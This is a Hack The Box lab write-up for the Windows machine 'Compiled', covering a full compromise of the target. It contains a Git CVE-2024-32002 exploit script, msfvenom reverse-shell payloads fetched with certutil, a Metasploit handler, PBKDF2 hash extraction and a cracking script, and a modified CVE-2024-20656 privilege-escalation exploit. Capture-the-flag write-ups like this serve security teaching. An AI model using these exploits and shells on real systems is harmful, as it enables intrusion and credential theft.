---
date: 2024-12-13T13:44:19-06:00
# description: ""
image: "/images/HTB-Compiled/Compiled.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Compiled"
type: "post"
---

* Platform: Hack The Box
* Link: [Compiled](https://app.hackthebox.com/machines/Compiled)
* Level: Medium
* OS: Windows
---

[Read this write up in french](https://scorpiosec.com/fr/posts/htb-compiled/)

Compiled begins with the discovery of a Gitea instance running on port 3000 and a compilation service on port 5000. By exploiting a vulnerability in the identified Git version (`CVE-2024-32002`), we gain initial access. We explore the system and uncover a database file containing user hashes and other critical information, allowing us to crack a password and perform a lateral movement. The system enumeration points to files related to Visual Studio 2019, leading to the discovery of `CVE-2024-20656`. By customizing and compiling a proof-of-concept (PoC), we exploit a privileged service running as `LocalSystem` to escalate to root.

Target IP address - `10.10.11.26`

## Scanning 

```
nmap -sC -sV -Pn -oA nmap/Compiled 10.10.11.26
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 14:21 CST
Nmap scan report for 10.10.11.26
Host is up (0.072s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=7f989393b9d73791; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=aVSW1KqfHyBa9Imz4uy8TuiagFw6MTczNDAzNDk3NjkzNjg4NjkwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 12 Dec 2024 20:22:56 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-arc-green">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Git</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=7277a535e35440ef; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=jbSopQ2xI6EjIO9rUIzxJnkVP-I6MTczNDAzNDk4MjU2NzU3OTcwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 12 Dec 2024 20:23:02 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.12.3
|     Date: Thu, 12 Dec 2024 20:22:56 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5234
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Compiled - Code Compiling Services</title>
|     <!-- Bootstrap CSS -->
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
|     <!-- Custom CSS -->
|     <style>
|     your custom CSS here */
|     body {
|     font-family: 'Ubuntu Mono', monospace;
|     background-color: #272822;
|     color: #ddd;
|     .jumbotron {
|     background-color: #1e1e1e;
|     color: #fff;
|     padding: 100px 20px;
|     margin-bottom: 0;
|     .services {
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.94SVN%I=7%D=12/12%Time=675B4620%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,37D5,"HTTP/1\.0\x20200\x20OK\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gi
SF:tea=7f989393b9d73791;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Co
SF:okie:\x20_csrf=aVSW1KqfHyBa9Imz4uy8TuiagFw6MTczNDAzNDk3NjkzNjg4NjkwMA;\
SF:x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Op
SF:tions:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2012\x20Dec\x202024\x2020:22:56\
SF:x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"th
SF:eme-arc-green\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\">\n\t<title>Git</title>\n\t<link\x
SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
SF:2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21w
SF:aWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGV
SF:kLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2
SF:l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwM
SF:DA")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20Al
SF:lowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Con
SF:trol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\n
SF:Set-Cookie:\x20i_like_gitea=7277a535e35440ef;\x20Path=/;\x20HttpOnly;\x
SF:20SameSite=Lax\r\nSet-Cookie:\x20_csrf=jbSopQ2xI6EjIO9rUIzxJnkVP-I6MTcz
SF:NDAzNDk4MjU2NzU3OTcwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2012\x20
SF:Dec\x202024\x2020:23:02\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.94SVN%I=7%D=12/12%Time=675B4621%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,1521,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.
SF:3\x20Python/3\.12\.3\r\nDate:\x20Thu,\x2012\x20Dec\x202024\x2020:22:56\
SF:x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Lengt
SF:h:\x205234\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20
SF:lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20
SF:\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Compiled\x20-\x20Code
SF:\x20Compiling\x20Services</title>\n\x20\x20\x20\x20<!--\x20Bootstrap\x2
SF:0CSS\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"http
SF:s://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min\.
SF:css\">\n\x20\x20\x20\x20<!--\x20Custom\x20CSS\x20-->\n\x20\x20\x20\x20<
SF:style>\n\x20\x20\x20\x20\x20\x20\x20\x20/\*\x20Add\x20your\x20custom\x2
SF:0CSS\x20here\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20'Ubuntu\x20Mon
SF:o',\x20monospace;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20back
SF:ground-color:\x20#272822;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20color:\x20#ddd;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\.jumbotron\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20background-color:\x20#1e1e1e;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20padding:\x20100px\x2020px;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20margin-bottom:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20}\n\x20\x20\x20\x20\x20\x20\x20\x20\.services\x20{\n\x20")%r(RTSPRequ
SF:est,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<he
SF:ad>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x
SF:20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x2
SF:0code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x
SF:20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\
SF:x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>
SF:\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.50 seconds
```

We find two ports: 3000 and 5000, from the nmap output we do not have accurate information about the services running on these ports.

## Enumeration

At `http://compiled.htb:3000/` we find a Gitea instance.

![Gitea instance](/images/HTB-Compiled/gitea_instance.png)

At `http://compiled.htb:5000/` we find a website offering compiling services.

![Compiled website](/images/HTB-Compiled/compiled_website.png)

In the `Explore` section of Gitea we find two repositories, one for the website on port 5000 and another one for a calculator program.

![Repository list](/images/HTB-Compiled/repository_list.png)

To use the application on port 5000, we have to provided an URL for a Github repository ending with `.git`.

![Compiled usage instructions](/images/HTB-Compiled/compiled_usage.png)

In the calculator repository we find a version for Git (2.45.0.windows.1).

![Git version](/images/HTB-Compiled/git_version.png)

After searching `git version 2.45.0 cve` on Google we find [CVE-2024-32002](https://www.cvedetails.com/cve/CVE-2024-32002/) with a PoC is available [here](https://amalmurali.me/posts/git-rce/).

### Exploit explanation

Our exploitation process leverages a vulnerability in Git (CVE-2024-32002) that stems from improper handling of symbolic links in case-insensitive filesystems (meaning that paths like `A/modules/x` and `a/modules/x` as treated identical). This vulnerability allows us to manipulate Git into writing files into the `.git/` directory of our submodule instead of the intended worktree.

The process involves creating a malicious repository (`scorpion`) with a post-checkout hook containing a reverse shell payload. This hook is configured to execute during specific Git operations, such as checkout. We then use `git submodule add` to link `scorpion` as a submodule of another repository, `venom`. This ensures that when the submodule is processed, the payload in `scorpion` is triggered.

A critical part of the exploit involves exploiting Git's allowance to update the `.git/` directory via symbolic links. By creating a symbolic link pointing to `dotgit.txt`, we trick Git into treating manipulated content as legitimate metadata. This bypasses validation checks, enabling us to place our reverse shell payload in the `.git/hooks` directory.

Finally, we submit the URL of the `venom` repository to the target application that clones and compiles repositories. During the cloning process, Git processes the submodule and encounters the malicious post-checkout hook in `scorpion`. This hook executes our reverse shell payload, establishing a connection to our listener.

## Initial Foothold

First we need to register a new account on the gitea instance.

![Gitea account creation](/images/HTB-Compiled/gitea_account_creation.png)

We also create two repositories.

![Gitea exploit repositories](/images/HTB-Compiled/exploit_repos.png)

[Here](https://github.com/amalmurali47/git_rce/blob/main/create_poc.sh), we find the Bash script used for the PoC, we can modify it for our needs.

Because we are probably using a new git account we will need to provide our identity first with:

```
git config --global user.email "you@example.com"
git config --global user.name "Your Name"
```

Here is the exact script I used, you still need to add a reverse shell command.

> Pay attention to the script you will need to modify it if your repositories names are different.

```bash
#!/bin/bash

# Configure Git settings for exploitation
git config --global protocol.file.allow always
git config --global core.symlinks true
git config --global init.defaultBranch main

# Clone the malicious repository (scorpion)
git clone http://compiled.htb:3000/kscorpio/scorpion.git
cd scorpion

# Set up the post-checkout hook with the reverse shell payload
mkdir -p y/hooks
cat >y/hooks/post-checkout <<EOF
#!/bin/sh
<INSERT YOUR PowerShell #3 (Base64) reverse shell from revshells.com here>
EOF

# Make the hook executable
chmod +x y/hooks/post-checkout

# Commit the hook to the repository
git add y/hooks/post-checkout
git commit -m "post-checkout"
git push

# Clone the venom repository and add the malicious submodule
cd ..
git clone http://compiled.htb:3000/kscorpio/venom.git
cd venom
git submodule add --name x/y "http://compiled.htb:3000/kscorpio/scorpion.git" A/modules/x

# Commit and push the submodule addition
git commit -m "add-submodule"
printf ".git" >dotgit.txt
git hash-object -w --stdin <dotgit.txt >dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" >index.info
git update-index --index-info <index.info
git commit -m "add-symlink"
git push
```

![exploit script execution](/images/HTB-Compiled/exploit_script.png)

After running the script we submit the link of our second repository at `http://compiled.htb:5000/`.

![malicious url](/images/HTB-Compiled/malicious_url.png)

A minute or two later we get a shell as `Richard`.

![initial foothold](/images/HTB-Compiled/initial_foothold.png)

This account does not have the user flag, so we need to look elsewhere. There is another user called `Emily` on the target, we most likely need to switch to that account.

We run winPEAS and learn that `Emily` is currently logged in on the system and also that `Richard` has full access to `C:\Program Files\Gitea` which we will further explore.

![Logged users](/images/HTB-Compiled/logged_users.png)

![Gitea directory](/images/HTB-Compiled/Gitea_directory.png)

### Lateral Movement (shell as Emily)

In `C:\Program Files\Gitea\data` we find the file `gitea.db`. If Emily has an account on the instance, we might find her credentials there.

![Gitea db file](/images/HTB-Compiled/gitea_db.png)

For convenience purposes let's switch to a meterpreter shell.

Create an executable and send it to the target.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT_NUMBER -f exe -o payload.exe


certutil.exe -urlcache -split -f http://WEBSERVER_IP:PORT_NUMBER/payload.exe payload.exe
```

![malicious exe file](/images/HTB-Compiled/msf_exe.png)


Configure the listener in Metasploit.

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <YOUR_IP>
set lport <PORT_NUMBER>
run
```

After executing the `.exe` file on the target we get a meterpreter shell. We can now easily download `gitea.db` with `download "C:\Program Files\Gitea\data\gitea.db"`.

![Gitea db file download](/images/HTB-Compiled/gitea_db_download.png)

We run the following queries and obtain the user hashes.

```
sqlite3 gitea.db

.tables

select * FROM user;
```

![hashes in the gitea.db file](/images/HTB-Compiled/hashes_in_giteadb.png)

Those are PBKDF2 hashes.

> PBKDF2 (Password-Based Key Derivation Function 2) is a cryptographic algorithm used to derive secure cryptographic keys from a password. It applies a pseudorandom function (such as HMAC) iteratively to the password along with a salt (a random value) to generate a key. The process is repeated many times (often thousands or tens of thousands of iterations) to slow down brute-force attacks and make it harder for attackers to recover the original password.

From [this hashcat page](https://hashcat.net/wiki/doku.php?id=example_hashes) we learn that the hash needs to follow this format: 
`<HASH_ALGORITHM>:<NUMBER_OF_ITERATIONS>:<base64_SALT>:<base64_hash>`. An example would be:

```
sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
```

Cracking the hash with hascat ends up taking too long which is unusual for HackTheBox, hash cracking is usually pretty quick.

![HTB hash cracking information](/images/HTB-Compiled/cracking_info.png)

![hashcat cracking process taking too long](/images/HTB-Compiled/hashcat_toolong.png)

So I asked ChatGPT for a Python script to find the password. This is possible because we already have all the information needed:
* The algorithm: pbkdf2
* The hash value: `97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16`
* The number of iterations: 50000
* The salt value: `227d873cca89103cd83a976bdac52486`
* The key length: 50

```python
import hashlib

def pbkdf2_decrypt(hash_value, salt, iterations, key_length, wordlist_path):
    # Convert the salt and hash to bytes (hex decoding)
    salt = bytes.fromhex(salt)
    hash_value = bytes.fromhex(hash_value)
    
    # Open the wordlist file
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as wordlist:
        for word in wordlist:
            word = word.strip()  # Remove any trailing spaces or newline characters
            
            # Hash the current word using PBKDF2 with HMAC SHA256
            derived_key = hashlib.pbkdf2_hmac('sha256', word.encode(), salt, iterations, dklen=key_length)
            
            # Check if the derived key matches the target hash
            if derived_key == hash_value:
                print(f"Password found: {word}")
                return word  # Return the password if it matches
        print("Password not found in the wordlist.")
        return None  # Return None if no match is found

# Example of usage
hash_value = '97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16'
salt = '227d873cca89103cd83a976bdac52486'
iterations = 50000
key_length = 50  # The length of the derived key in bytes
wordlist_path = '/usr/share/wordlists/rockyou.txt'  # Path to the wordlist

# Call the function to start the cracking process
password = pbkdf2_decrypt(hash_value, salt, iterations, key_length, wordlist_path)
```

After running the script we find the password to be: `12345678`.

![Emily password found](/images/HTB-Compiled/emily_pwd.png)

We can use `RunasCs.exe` to obtain a shell as `Emily` with the command below.

```
.\runascs.exe Emily "12345678" powershell -r 10.10.14.231:5555
```

![Emily RunasCs shell](/images/HTB-Compiled/emily_rcs_shell.png)

It is also possible to login as `Emily` via `evil-winrm`, and the user flag is in `C:\Users\Emily\Desktop`.

```
evil-winrm -u "Emily" -p "12345678" -i compiled.htb
```

![Emily shell](/images/HTB-Compiled/emily_shell.png)

## Privilege Escalation

We run winPEAS again and find an entry related to Microsoft Visual Studio. 

```
File Permissions "C:\Users\All Users\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe": Authenticated Users [WriteData/CreateFiles]
```

![MS Visual Studio winpeas](/images/HTB-Compiled/MVS_2019.png)

In `C:\Users\Emily\Documents` we also find a directory for `Visual Studio 2019`.

![VS Studio 2019](/images/HTB-Compiled/VS_Studio_2019.png)

Searching for `MofCompiler.exe cve` on Google, we find the [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) with a PoC [here](https://github.com/ruycr4ft/CVE-2024-20656/tree/main).

This vulnerability can be exploited by tricking a user (no need for that here since we control the user) into running a malicious executable or script, leveraging the trust Visual Studio has in such processes.

As pointed by the article, `VSStandardCollectorService150` is running under the `LocalSystem` account on our target.

![VSStandardCollectorService150](/images/HTB-Compiled/VSStandard_service.png)

We need to modify the exploit to make it work for our case. Looking at the content of `main.cpp` on the PoC Github repository, we notice that the location of `VSDiagnostics.exe` is referenced. We need to modify this line with the correct directory and the correct year (2019 in this case).

> `VSDiagnostics.exe` is a diagnostic tool included with Microsoft Visual Studio. It is primarily used for analyzing and troubleshooting issues in Visual Studio itself or in applications being developed using Visual Studio.

![MSVS location](/images/HTB-Compiled/MSVS_location.png)

```
WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
```

We also need to modify the `cb1` function with the path to our malicious exe file. This file will be copied and renamed as `MofCompiler.exe` when we execute the service.

![cb1 function](/images/HTB-Compiled/cb1_function.png)

```
CopyFile(L"c:\\tmp\\rev.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
```

To obtain the `Expl.exe` file we need to compile the project specifically for the 2019 version with Visual Studio (this requires a windows machine).

If you have Visual Studio 2022 like me, you will need to specify the 2019 Toolset for the compilation. On your Windows machine find `vs_installer.exe`, mine is in `C:\Program Files (x86)\Microsoft Visual Studio\Installer`.

![vs installer](/images/HTB-Compiled/vs_installer.png)

After opening it, select `Modify`.

![vs modify](/images/HTB-Compiled/vsstudio_modify.png)

Then go to the `Individual Components` section, search for `v142`, select `MSVC v142 - VS 2019 C++ x64/x86 build tools` and click `Modify` to install the components.

![v142 build tools](/images/HTB-Compiled/v142.png)

Clone the PoC repository, launch Visual Studio and select `Open a project or solution`. Find the `CVE-2024-20656` directory and open the `Expl.sln` in the `Expl` directory. Now you should have all the file opened in the `Solution Explorer` menu.

![Solution Explorer](/images/HTB-Compiled/SE_menu.png)

Right-click the `Solution Explorer` menu and select `Properties` at the bottom. You can also use `Alt + Enter` to do the same thing. 

Under `Configuration Properties` -> `General`, set the `Platform Toolset` to `Visual Studio 2019 (v142)` and click `Apply`.

![v142 apply](/images/HTB-Compiled/v142_apply.png)

Now click on `main.cpp` to start modifying it. Here is the first modification:

![WCHAR modification](/images/HTB-Compiled/WCHAR_modification.png)

And here is the second one:

![void cb1 modification](/images/HTB-Compiled/cb1_modification.png)

To compile the project click on `Build` in the top-menu -> `Batch Build` -> check `Release|x64` -> and click `Build`.

![compiling process](/images/HTB-Compiled/compiling.png)

After the successful compilation, we have a new directory called `x64` and inside the `Release` directory is our `Expl.exe` file.

![Expl.exe file](/images/HTB-Compiled/expl_exe.png)

Create the malicious `rev.exe` with msfvenom.

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=PORT_NUMBER -f exe -o rev.exe
```

![malicious exe file](/images/HTB-Compiled/bad_exe.png)

Prepare the listener in Metasploit.

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <YOUR_IP>
set lport <PORT_NUMBER>
run
```

**For the following steps, make sure you have both a RunasCs shell and an evil-winrm shell for Emily.**

In the RunasCs shell, create the `tmp` directory in `C:\` and put both `rev.exe` and `Expl.exe` inside it.

![tmp directory](/images/HTB-Compiled/tmp_directory.png)

In the evil-winrm shell, run:

```
./RunasCs.exe Emily "12345678" C:\tmp\Expl.exe
```

After a minute or so, we obtain a meterpreter shell as `NT AUTHORITY\SYSTEM`, and find the root flag in `C:\Users\Administrator\Desktop`.

![root shell](/images/HTB-Compiled/root_shell.png)

![root flag](/images/HTB-Compiled/root_flag.png)

This box was definitely challenging for a "medium" one. Thank you for reading this write up and I hope you found it useful!

